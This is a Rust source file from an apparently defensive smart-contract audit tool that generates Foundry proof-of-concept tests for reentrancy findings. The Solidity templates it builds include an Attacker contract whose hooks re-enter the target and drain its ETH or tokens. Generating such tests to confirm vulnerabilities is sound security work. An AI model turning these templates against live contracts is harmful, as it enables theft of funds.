//! Reentrancy family (family 1): `Reentrancy` / `ReadOnlyReentrancy` /
//! `Erc777Reentrancy` / `MintCallbackReentrancy`.
//!
//! One fixed harness — a `Test` contract that deploys the target + an `Attacker`
//! contract — with 3 re-entry-hook variants selected by category:
//! * native ETH (`Reentrancy`/`ReadOnlyReentrancy`) → `receive()`,
//! * ERC777 (`Erc777Reentrancy`) → `tokensReceived(...)`,
//! * ERC721/1155 mint callback (`MintCallbackReentrancy`) →
//!   `onERC721Received(...)` + `onERC1155Received(...)`.
//!
//! The asserted hypothesis is the classic drain invariant:
//! `assertGt(attacker.balance, before)` && `assertLt(target.balance, before)`.

use super::{header, PocTemplate};
use crate::context::{PocContext, Tier};
use sluice_findings::Category;

pub struct ReentrancyTemplate;

#[derive(Clone, Copy, PartialEq)]
enum Hook {
    Eth,
    Erc777,
    Erc721,
}

impl ReentrancyTemplate {
    fn hook(cat: Category) -> Hook {
        match cat {
            Category::Erc777Reentrancy => Hook::Erc777,
            Category::MintCallbackReentrancy => Hook::Erc721,
            _ => Hook::Eth,
        }
    }
}

impl PocTemplate for ReentrancyTemplate {
    fn applies(&self, cat: Category) -> bool {
        matches!(
            cat,
            Category::Reentrancy
                | Category::ReadOnlyReentrancy
                | Category::Erc777Reentrancy
                | Category::MintCallbackReentrancy
        )
    }

    fn tier(&self, cx: &PocContext) -> Tier {
        // T1 when we can deploy concretely (no FILL ctor args) AND we localized
        // the external call to re-enter; otherwise T2.
        if !cx.has_fill() && cx.arming_call.is_some() {
            Tier::T1
        } else {
            Tier::T2
        }
    }

    fn render(&self, cx: &PocContext) -> String {
        let tier = self.tier(cx);
        let hook = Self::hook(cx.finding.category);
        let mut s = header(cx, tier);

        let target = &cx.contract_ident;
        let func = &cx.function_ident;
        let call_args = cx.call_args_str();
        let reenter = cx
            .arming_call
            .as_ref()
            .and_then(|c| c.func_name.clone())
            .unwrap_or_else(|| "the external call".to_string());
        let drained = cx
            .drained_var
            .clone()
            .unwrap_or_else(|| "the post-call balance update".to_string());

        // Optional attacker seed-deposit (only if the target exposes a payable
        // deposit-shaped fn — otherwise we rely purely on the drain assertion).
        let (seed_setup, deposit_method) = match &cx.deposit_fn {
            Some(dep) if !dep.is_empty() => (
                "        // Seed: credit the attacker so the contract owes it (re-entry needs a balance).\n\
                 \x20       vm.deal(address(attacker), 1 ether);\n\
                 \x20       attacker.seedDeposit{value: 1 ether}();\n"
                    .to_string(),
                format!("target.{dep}{{value: msg.value}}();"),
            ),
            _ => (
                "        // (No payable deposit detected; fund the target directly so it has ETH to drain.)\n\
                 \x20       vm.deal(address(target), 10 ether);\n"
                    .to_string(),
                "/* no payable deposit detected on the target */".to_string(),
            ),
        };

        // The constructor line, with a comment naming the params.
        let ctor = format!(
            "        // {ctor_comment}\n        target = new {target}({ctor_args});",
            ctor_comment = cx.ctor_comment(),
            ctor_args = cx.ctor_args_str(),
        );

        s.push_str(&format!(
            "contract {target}_reentrancy_PoC is Test {{\n\
             \x20   {target} target;\n\
             \x20   Attacker attacker;\n\n\
             \x20   function setUp() public {{\n\
             {ctor}\n\
             \x20       attacker = new Attacker(target);\n\
             {seed_setup}\
             \x20   }}\n\n\
             \x20   /// Re-enters `{target}.{func}` via `{reenter}` before `{drained}` settles.\n\
             \x20   function test_reentrancy_drains_{func}() public {{\n\
             \x20       uint256 targetBefore = address(target).balance;\n\
             \x20       uint256 attackerBefore = address(attacker).balance;\n\
             \x20       attacker.attack();\n\
             \x20       // EXPLOIT HYPOTHESIS: the attacker withdrew more than it was owed by\n\
             \x20       // re-entering `{func}` before `{drained}` was written.\n\
             \x20       assertGt(address(attacker).balance, attackerBefore, \"attacker did not profit\");\n\
             \x20       assertLt(address(target).balance, targetBefore, \"target was not drained\");\n\
             \x20   }}\n\
             }}\n\n",
        ));

        // ---- the Attacker contract ----
        let reenter_call = format!("target.{func}({call_args});");
        let hook_body = match hook {
            Hook::Eth => format!(
                "    // RE-ENTRY POINT (native ETH): fires while `{target}` still owes us.\n\
                 \x20   receive() external payable {{\n\
                 \x20       if (address(target).balance >= 1) {{\n\
                 \x20           {reenter_call}\n\
                 \x20       }}\n\
                 \x20   }}\n"
            ),
            Hook::Erc777 => format!(
                "    // RE-ENTRY POINT (ERC777 `tokensReceived` hook): fires on token credit.\n\
                 \x20   function tokensReceived(\n\
                 \x20       address, address, address, uint256, bytes calldata, bytes calldata\n\
                 \x20   ) external {{\n\
                 \x20       if (!entered) {{ entered = true; {reenter_call} }}\n\
                 \x20   }}\n"
            ),
            Hook::Erc721 => format!(
                "    // RE-ENTRY POINT (ERC721/1155 mint callback): fires during safeMint/safeTransfer.\n\
                 \x20   function onERC721Received(address, address, uint256, bytes calldata)\n\
                 \x20       external returns (bytes4)\n\
                 \x20   {{\n\
                 \x20       if (!entered) {{ entered = true; {reenter_call} }}\n\
                 \x20       return this.onERC721Received.selector;\n\
                 \x20   }}\n\
                 \x20   function onERC1155Received(address, address, uint256, uint256, bytes calldata)\n\
                 \x20       external returns (bytes4)\n\
                 \x20   {{\n\
                 \x20       if (!entered) {{ entered = true; {reenter_call} }}\n\
                 \x20       return this.onERC1155Received.selector;\n\
                 \x20   }}\n"
            ),
        };

        s.push_str(&format!(
            "contract Attacker {{\n\
             \x20   {target} private target;\n\
             \x20   bool private entered;\n\
             \x20   constructor({target} _t) {{ target = _t; }}\n\n\
             \x20   function seedDeposit() external payable {{ {deposit_method} }}\n\
             \x20   function attack() external {{ {reenter_call} }}   // first entry\n\n\
             {hook_body}\
             }}\n",
        ));

        s
    }
}
